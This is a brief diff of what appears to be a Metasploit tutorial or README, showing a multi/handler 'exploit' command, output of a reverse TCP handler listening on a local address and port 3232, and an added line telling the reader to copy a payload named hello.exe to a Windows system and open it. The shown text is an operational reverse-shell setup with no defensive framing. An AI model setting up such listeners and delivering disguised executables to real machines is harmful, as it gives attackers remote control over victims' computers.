@@ -69,4 +69,4 @@ msf6 exploit(multi/handler) > exploit
 ```terminal
 [*] Started reverse TCP handler on 172.20.10.4:3232 
 ```
-thanks
+All you have to do is copy the hello.exe file and open it on a Windows system.
